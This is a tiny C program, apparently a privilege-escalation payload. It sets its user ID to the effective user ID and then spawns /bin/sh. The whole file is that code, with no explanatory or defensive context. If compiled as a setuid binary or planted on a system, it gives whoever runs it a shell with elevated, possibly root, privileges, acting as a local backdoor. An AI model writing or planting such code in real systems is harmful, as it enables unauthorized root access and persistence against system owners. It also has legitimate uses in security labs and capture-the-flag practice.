#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>

int main(){

	setuid(geteuid());
	system("/bin/sh");
	return 0;
}
